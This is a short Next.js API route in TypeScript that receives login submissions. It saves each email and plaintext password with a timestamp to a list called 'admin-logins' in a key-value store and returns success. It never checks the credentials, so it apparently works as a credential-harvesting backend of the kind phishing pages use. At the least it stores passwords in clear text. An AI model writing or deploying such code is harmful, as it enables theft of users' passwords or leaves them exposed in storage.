import { NextResponse } from "next/server";
import { kv } from "@vercel/kv";

interface LoginEntry {
  email: string;
  password: string;
  rememberMe?: boolean;
  timestamp: string;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const loginEntry: LoginEntry = {
      email: body.email,
      password: body.password,
      rememberMe: body.rememberMe ?? false,
      timestamp: new Date().toISOString(),
    };

    // Get existing logins from KV
    const existingLogins = (await kv.get("admin-logins")) as LoginEntry[] | null;

    // Append new login
    const updatedLogins = existingLogins ? [...existingLogins, loginEntry] : [loginEntry];

    // Save back to KV
    await kv.set("admin-logins", updatedLogins);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error writing admin login:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
